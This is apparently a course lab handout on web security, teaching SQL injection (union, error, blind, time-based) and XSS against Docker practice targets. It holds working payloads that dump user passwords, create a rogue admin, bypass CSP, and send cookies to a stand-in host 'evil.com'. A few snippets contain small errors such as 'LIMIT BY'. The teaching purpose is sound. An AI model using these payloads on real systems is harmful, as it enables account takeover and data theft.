# Lab 6: Web Security (NOT READY)

{% hint style="danger" %}
READ: Any knowledge and techniques presented here are for your learning purposes only. It is **ABSOLUTELY ILLEGAL** to apply the learned knowledge to others without proper consent/permission, and even then, you must check and comply with any regulatory restrictions and laws.&#x20;
{% endhint %}

---

## 6.0.0 Introduction

SQL injection (SQLi) and Cross Site Scripting (XSS) are a type of **injection (AS03:2021)** vulnerability that have been listed as one of the top 10 web application security risks by OWASP ([OWASP Top 10](https://owasp.org/www-project-top-ten/)). This lab will explore these two types of vulnerabilities on vulnerable web applications and explain how to detect these vulnerabilities via source code review and black box testing.

---

## 6.1.0  SQLi

A SQLi attack injects a malicious SQL query via input data from the client to the web application. If a website does not securely sanitise user inputs being inserted into a SQL query, then an attacker can malform the query to perform additional operations that were never intended.

For this section, we will explore how SQLi vulnerabilities can occur, how to exploit the follow types of SQLi attacks and using tools such as `sqlmap` to automatically discover and exploit SQLi vulnerabilities.

- Union-based SQLi
- Error-based SQLi
- Blind-based SQLi
- Time-based SQLi

---

### 6.1.1 Union-based SQLi Attacks

Union-based SQLi attacks exploit a SQLi vulnerability by appending the results of a malicious query after the results of the original query. This is done by injecting `UNION` statement into the SQL query then using `SELECT` to query data from other databases. It is the easiest type of SQLi vulnerability to exploit and can be used to dump all data from a SQL database quickly.

This section will explore how to detect Union-based SQLi attack vectors, the methodology of enumerating the database to find sensitive information quickly and dumping the data you need.

**Detecting a SQLi attack vector**

The easiest way to see if some input is not properly santised for a SQL query is by sending a single `'` or `"` character. If the website crashes (sends a 500 HTTP status code) then it is a strong indication that the malicious input has caused a SQL syntax error, which caused the website to crash. 

However, if the web application properly handles errors the page would not return a 500 HTTP status code, making the SQLi attack vector harder to detect. Therefore, a more effective way to detect if an input is vulnerable to SQLi is to first discover an input that always returns a result, then try injecting a SQL conditional and see if the same result returns.

For an example, a web application executes the following SQL query when you search for items on the store, where `{search}` is replaced with the user's input. The contents of the `items` table is shown below the query.

```sql
SELECT name, description, amount, price FROM items WHERE name LIKE '{search}'
```

*items table*
| name | description | amount | price |
| ---- | ----------- | ------ | ----- |
| milk crate | a milk crate stolen from coles | 20 | 10000 |
| 1L of 4 year old petrol | some petrol siphoned out of a lawn mower | 13 | 600 |
| 1g of dirt | literally dirt | 20000 | 999999 |

If you just searched `milk crate` on the store then it would only show you the results for the item named `milk crate`. However, if you searched `milk crate' AND '1'='1` and it returns with the same results then you have found the attack vector for exploiting the SQLi vulnerability. This is because the input malforms the query to still search for `milk crate` and insert a SQL `AND` conditional that always returns **true** (the malformed query is shown below). However, if the input was not vulnerable then the DB would of searched for `milk crate' AND '1'='1` and return no results since there are no items with that name.

*The malformed query*
```sql
SELECT name, description, amount, price FROM items WHERE name LIKE 'milk crate' AND '1'='1'
```

**Methodology for exploiting Union-based SQLi**

**Step 1: Finding the number of columns your payload needs to return**

Once you have discovered the vulnerable input to SQLi, the first step is to determine how many columns should be returned by the vulnerable SQL query. This is because when you use `UNION SELECT` to append additional results the number of columns needs to match the number of columns of the original query, otherwise the SQL query will cause an SQL error.

You can determine the number of columns you need by using `ORDER BY` or `GROUP BY` and incrementing the column index until an error or no result is returned.

Using the previous `items` example.

- `milk crate' ORDER BY 1--`: Returns the milk crate result
- `milk crate' ORDER BY 2--`: Returns the milk crate result
- `milk crate' ORDER BY 3--`: Returns the milk crate result
- `milk crate' ORDER BY 4--`: Returns the milk crate result
- `milk crate' ORDER BY 5--`: Returns no results. This is because there is no column with the index 5 in the `items` table and causes an SQL error. Therefore, it indicates that the original query returns 4 columns.

An alternative is using the `UNION SELECT` statement with constant values until an error does not occur.

- `milk crate' UNION SELECT 1--`: Returns no results.
- `milk crate' UNION SELECT 1,2--`: Returns no results.
- `milk crate' UNION SELECT 1,2,3--`: Returns no results.
- `milk crate' UNION SELECT 1,2,3,4--`: Returns the milk crate result and a row with the numbers 1, 2, 3 4, and 5.
- `milk crate' UNION SELECT 1,2,3,4,5--`: Returns no results.

**Step 2: Leaking Information About the Database Management System**

The next step is to discover what databases are available, the table names in those databases and the columns of those database. For this section it will be assumed that the database management system is MySQL, since the queries can be different across DB management systems. For more information about SQLi enumeration for other DB management systems check out the [PayloadAllTheThings repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection).

On MySQL databases, the **`information_schema`** database stores all of the metadata about databases, tables and columns stored on the MySQL server. The following SQL queries show how you can retrieve this information from the `information_schema`.

```sql
-- Dumps the names of databases
SELECT schema_name FROM information_schema.schemata;

-- Dumps the names of tables from a database called 'storedb'
SELECT table_name FROM information_schema.tables WHERE table_schema = 'storedb';

-- Dumps the columns for the table called 'users'
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
```

To execute these queries for our SQLi attack, we need craft our `UNION SELECT` to return 4 columns and also show the columns that we want to view.

```
' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata--
```

**Step 3: Dumping Information from Tables**

Once you have discovered the tables and columns you want to dump, you then just rewrite your `UNION SELECT` payload to dump those columns you want to view.

eg.
```
' UNION SELECT username,password,3,4 FROM users--
```

---

### 6.1.2 Union-based SQLi Exercise

We will be using `docker compose` for running the servers during this lab. If you do not have `docker compose` installed follow [Docker's documentation](https://docs.docker.com/compose/install/).

**If you are using an arm64 processor (eg. M series Macs), then you will need to install `rosetta2` using the command `softwareupdate --install-rosetta`!**

To start this execise, download [docker-compose.sqli_union.yml](./files/lab6/docker-compose-files/docker-compose.sqli_union.yml). If you are using a Mac M series laptop, add `-arm` to the end of the image name or add `platform: linux/amd64` in the YAML file.

You can start the servers using one of the following commands that will automatically pull the images and start the containers.

```
docker compose -f docker-compose.sqli_union.yml up
```

or 

```
docker compose -f docker-compose.sqli_union.yml up
```

**Make sure when you are done to delete the Docker containers by running the following command**

```
docker compose -f docker-compose.sqli_union.yml down
```

To complete this exercise, you need to exploit the SQLi union-based vulnerability to retrieve a flag stored on the MySQL database and demonstrate the process to your lab facilitator. All data is stored inside the database called `vulndb`, but you don't know the name of the table or column for where the flag is stored. Therefore, you first need to dump all of the tables in the `vulndb` database, then dump the column names from the table with the flag (the table is obvious when you see the name for it).

**Using `sqlmap` is not allowed!**

---

### 6.1.3 Error-based SQLi Attacks

The only issue with Union-based SQLi is that it relies on the results of the SQL query being shown to the end user on the website to work. In a number of circumstances the results of a vulnerable SQL query are never displayed on the website and are only used by the backend web application.

Error-based SQLi attacks are an alternative to Union-based SQLi that exploits verbose error messages that are displayed on a website if a SQL error occurs. An attacker can abuse these error messages to leak out information from the database using the error messages that are shown on the website.

For MySQL servers, the **`updatexml`** is a useful functioning for causing an SQL error and leaking the result of a different query in the error message. For an example, the below payload is an example of using `updatexml` to leak a name of a database from the `information_schema.schemata` table. However, this payload will not always work and you would normally need to experiment how to leak data using error messages.

```
' AND updatexml(null,concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 1,1)),null)--
```

---

### 6.1.4 Error-based SQLi Exercise

For this execise, download [docker-compose.sqli_error.yml](./files/lab6/docker-compose-files/docker-compose.sqli_error.yml) and run the Docker containers using the following command.

```
docker compose -f docker-compose.sqli_error.yml up
```

To complete this exercise, demonstrate to your lab facilitator exploiting the vulnerability and showing the flag stored on the database in the error messages.

**Using `sqlmap` is not allowed!**

---

### 6.1.5 Blind-based SQLi Attacks

There are a number of scenarios where a vulnerable SQL query is executed on the backend web application and the results/errors are never directly displayed to the end user. However, if the content on the page changes depending on the results of the vulnerable SQL query then an attacker can still exfiltrate data from the SQL server.

Blind-based SQLi works by executing malicious queries that return a boolean value that impacts the response of the web application to indicate the correct value that is being queried. An example of python code with a vulnerable SQLi query that impacts content of a page is shown below.

```python
import sqlite3

def count_items(search: str) -> int:
    with sqlite3.connect('/tmp/somedatabase.sqlite') as con
        cur = con.cursor()
        cur.execute("SELECT name FROM items WHERE name LIKE '{search}'".format(search))
        return len(cur.fetchall())
```

In the above code snippet, the actual results of the query are never returned to the end user and only returns the number of rows. An attacker can use the returned the count value to indicate if they have found a true value for a malicious character.

For an example, let's say an attacker is trying to dump the password for the `admin` user stored in the `users` table on the database. The attacker will first want to figure out the length of the stored password by brute forcing the length until the count changes to indicate the correct length has been found. This can be done using the `length` SQL function then executing query as a parameter for the `length` function (shown below).

```sql
length((SELECT password FROM users WHERE username='admin' LIMIT BY 1))=1
```

The attacker can then determine if the password has a length of 1 character by sending `milk crate' AND length((SELECT password FROM users WHERE username='admin' LIMIT BY 1))=1--` (the malformed query is shown below).

```sql
SELECT name FROM items WHERE name LIKE 'milk crate' AND length((SELECT password FROM users WHERE username='admin' LIMIT BY 1))=1--'
```

If the `admin` password has a length of 1, then the application response will show a count of 1 since 1=1. If the count is 0, then it would indicate that the length of the password is not 1 and the attacker will then check if the length is equal to 2 and so on.

This methodology can also be used to exfiltrate the values of the password by brute forcing the value of a character in the password until the full password has been leaked. Instead of using the `length` function to exfiltrate the length of the password you can use the MySQL `substring` function (if the DB management system is MySQL). `substring` returns a substring of a string, for an example `substring("hack the planet", 4, 1)` would return the letter `k`. Now let's say that the actual password for the `admin` account is `carrot`. An attacker can retrieve the full value of the payload as shown below:

```
# Count is 0 since the first letter of the password is not 'a'
milk crate' AND substring((SELECT password FROM users WHERE username='admin' LIMIT BY 1), 1, 1)='a'--

# Count is 0 since the first letter of the password is not 'b'
milk crate' AND substring((SELECT password FROM users WHERE username='admin' LIMIT BY 1), 1, 1)='b'--

# Count is 1 since the first letter of the password is 'c'
milk crate' AND substring((SELECT password FROM users WHERE username='admin' LIMIT BY 1), 1, 1)='c'--

# Count is 1 since the second letter of the password is 'a'
milk crate' AND substring((SELECT password FROM users WHERE username='admin' LIMIT BY 1), 2, 1)='a'--

# Count is 0 since the third letter of the password is not 'a'
milk crate' AND substring((SELECT password FROM users WHERE username='admin' LIMIT BY 1), 3, 1)='a'--

...
```

There is one issue with this approach. For MySQL, string searches for nonbinary strings (`CHAR`, `VARCHAR` and `TEXT`) use the collation of the comparison operands and are **case insensitive**! However, binary strings (`BINARY`, `VARBINARY` and `BLOB`) compare the numeric values of the bytes and the comparison is **case sensitive**. The following exercise would be constructing a Blind-based SQLi payload that is **case sensitive**.

---

### 6.1.6 Blind-based SQLi Exercise

For this execise, download [docker-compose.sqli_blind.yml](./files/lab6/docker-compose-files/docker-compose.sqli_blind.yml) and run the Docker containers using the following command.

```
docker compose -f docker-compose.sqli_blind.yml up
```

Since SQLi blind-based attacks are an inferred type of attack, [a template proof of concept script has been provided where you only need to fill in the payload](./files/lab6/provided-files/sqli_blind_template.py). Your payload needs to use format strings and the MySQL function `group_concat` in the functions `exploit` and `get_length` in the provided code.

You will get 2 marks for demonstrating the following tasks to your lab facilitator:

1. Leaking the flag stored on the database using Blind-Based SQLi. **You can use `sqlmap` for this part if your code does not work**.
2. Show your lab facilitator your python code and demonstrate it dumping the flag on the database.

**The flag has to match the correct case! So be careful how you construct your SQLi payload.**

--- 

### 6.1.7 Time-based SQLi Attacks

If the vulnerable SQL query does not have show any results or alter the response, then a time-based SQLi attack is required. Time-based is similar to Blind-based SQLi, but instead of altering the response you cause the web application to **sleep** when you find the correct value and delaying the response from the website.

In SQL you can write an **if** statement using the MySQL function `IF`. The below SQLi payload queries if the first character of the `admin` password is `a` and sleeps for 3 seconds if it is `a`.

```
' AND IF(substring((SELECT password FROM users WHERE username='admin' LIMIT BY 1), 2, 1)='a', SLEEP(3), 0)--
```

---

### 6.1.8 Time-based SQLi Exercise

For this execise, download [docker-compose.sqli_time.yml](./files/lab6/docker-compose-files/docker-compose.sqli_time.yml) and run the Docker containers using the following command.

```
docker compose -f docker-compose.sqli_time.yml up
```

Since SQLi time-based attacks are an inferred type of attack, [a template proof of concept script has been provided where you only need to fill in the payload](./files/lab6/provided-files/sqli_blind_template.py). Your payload needs to use format strings and the MySQL function `group_concat` in the functions `exploit` and `get_length` in the provided code.

You will get 2 marks for demonstrating the following tasks to your lab facilitator:

1. Leaking the flag stored on the database using Time-Based SQLi. **You can use `sqlmap` for this part if your code does not work**.
2. Show your lab facilitator your python code and demonstrate it dumping the flag on the database.

**The flag has to match the correct case! So be careful how you construct your SQLi payload.**

---

## 6.2.0 XSS Attacks

XSS attacks exploit a HTML injection vulnerability that executes malicious javascript that can access a victim's cookies, session tokens or other sensitive information from a trusted source. This lab we will explore exploiting client-side XSS vulnerabilities.

---

### 6.2.1 Exploiting a Basic XSS Vulnerability

The simplest attack vector for a XSS attack is to see `<script>alert(123)</script>` causes an alert to be displayed. If it does then the page is not filtering the `<` and `>` or `<script>`, enabling malicious javascript to be executed.

If the session cookies have the `HttpOnly` attribute to `false`, then you can read the cookie values using `document.cookie`. Below are some example XSS payloads for exfiltrating session cookie information to a remote server at `https://evil.com`.

```html
<!-- Using the fetch API (not supported on older browsers) -->
<script>fetch("https://evil.com/?nomnom="+document.cookie);</script>

<!-- Using the XMLHttpRequest API -->
<script>request = new XMLHttpRequest();request.open("GET", "https://evil.com/?nomnom="+document.cookie);request.send()</script>

<!-- Redirecting to evil.com -->
<script>window.location = "https://evil.com/?nomnom="+document.cookie</script>
```

However, if the session cookies have `HttpOnly` attribute set to `true` you can still perform actions as the victim on the vulnerable website. Below is an example XSS payload that adds a new admin user on the website for some vulnerable web application if the victim is an admin user.

```html
<script>
    fetch("/api/users/add_admin",{
        method: 'post',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({"username": "evil-user-mwahaha"}) 
    });
</script>
```

---

### 6.2.2 Basic XSS Attack Exercise

For this execise, download [docker-compose.xss_basic.yml](./files/lab6/docker-compose-files/docker-compose.xss_basic.yml) and run the Docker containers using the following command.

```
docker compose -f docker-compose.xss_basic.yml up
```

Next, we will be running a basic HTTP server for receiving the exfiltrated cookie for the admin user. You can do this using the following command that will start the `python` HTTP server.

```
python3 -m http.server 80
```

To complete this exercise, demonstrate to the lab facilitator exfiltrating the admin's cookie by exploiting the XSS vulnerability.

---

### 6.2.3 Exploiting XSS Using Other HTML Tags

Sometimes a web application will have a filter implemented that removes `<script>` from the user input or the Content-Security-Policy has disabled inline execution of JavaScript code (discussed more in section 6.2.3). However, this filter is not sufficient to prevent a XSS attack since there are large number of other HTML tags that can also execute JavaScript. For an example, the `<img>` tag has an `onerror` attribute that executes JavaScript code if an error occurs trying to load the image. So you can still trigger the XSS vulnerability with the following payload.

```html
<img src=x onerror="window.location='https://evil.com/?nomnom='+document.cookie" />
```

Below are a list of other XSS payloads using other HTML tags besides `<script>` and more a listed [here](https://raw.githubusercontent.com/pgaijin66/XSS-Payloads/master/payload/payload.txt).

```html
<svg onload="window.location='https://evil.com/?nomnom='+document.cookie" />
<div onpointerover="window.location='https://evil.com/?nomnom='+document.cookie">MOVE HERE</div>
<body onload="window.location='https://evil.com/?nomnom='+document.cookie"></body>
<video src=_ onloadstart="window.location='https://evil.com/?nomnom='+document.cookie" />
```

---

### 6.2.4 XSS Using Other HTML Tags Exercise

For this execise, download [docker-compose.xss_alt_tag.yml](./files/lab6/docker-compose-files/docker-compose.xss_alt_tag.yml) and run the Docker containers using the following command.

```
docker compose -f docker-compose.xss_alt_tag.yml up
```

To complete this exercise, demonstrate to the lab facilitator exfiltrating the admin's cookie by exploiting the XSS vulnerability without the `<script>` HTML tag.

---

### 6.2.3 Bypassing Content Security Policy Protections

The Content-Security-Policy (CSP) is a response header sent by web applications to browsers that define trusted sources for web content and is a recommended mitigation strategy against XSS attacks. The web browser will read the Content-Security-Policy and rejects rendering any components that do not comply with the policy. An example of a CSP configuration that will only allow rendering content hosted on the website is shown below.

```
Content-Security-Policy: default-src 'self';
```

The downside of Content-Security-Policies is that a secure configuration can significantly impact what can be rendered on the website. Therefore, most websites specify exemptions for remote resources that can be loaded. For an example the CSP below has allowed `unsafe-eval` for JavaScript code on `https://cdnjs.cloudflare.com/`.

```
Content-Security-Policy: default-src 'self';script-src 'self' 'unsafe-eval' https://cdnjs.cloudflare.com/;style-src 'self' 'unsafe-inline' https://unpkg.com/nes.css/ https://fonts.googleapis.com/;font-src 'self' https://fonts.gstatic.com/;img-src 'self' data:;child-src 'none';object-src 'none'
```

However, an attacker can bypass the above CSP since it does not specify exact JavaScript files from `https://cdnjs.cloudflare.com/` and vulnerable code to XSS that is hosted on `https://cdnjs.cloudflare.com/` can be loaded. The below payload bypasses the CSP by loading the XSS vulnerable AngularJS version 1.4.6 JavaScript file then executing the payload using a `<div>` tag.

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };window.location = "https://evil.com/?nomnom="+document.cookie;//');}} </div>
```

[HackTricks documents a large variety of methods for bypassing Content-Security-Policy headers using third party endpoints.](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)

---

### 6.2.5 Bypassing CSP Exercise

For this execise, download [docker-compose.xss_csp.yml](./files/lab6/docker-compose-files/docker-compose.xss_csp.yml) and run the Docker containers using the following command.

```
docker compose -f docker-compose.xss_csp.yml up
```

This exercise is a lot harder than the other XSS exercises. The website now uses the following Content-Security Policy (you can see it by viewing the HTML content on the website).

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://code.jquery.com/ https://www.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com/; font-src https://fonts.googleapis.com https://fonts.gstatic.com/;">
```

You need to research a method to exploit the XSS vulnerability with this CSP and demonstrate it to your lab facilitator. Below are some things to consider.

1. The CSP prevents exfiltrating data using `fetch`.
2. One of the allowed sources has a JSONP endpoint that you can use in your exploit.
3. If you have the correct method but it is not working, **make sure you a properly URL encoding your payload**! For an example, the `+` in a URL decodes to ` `.

---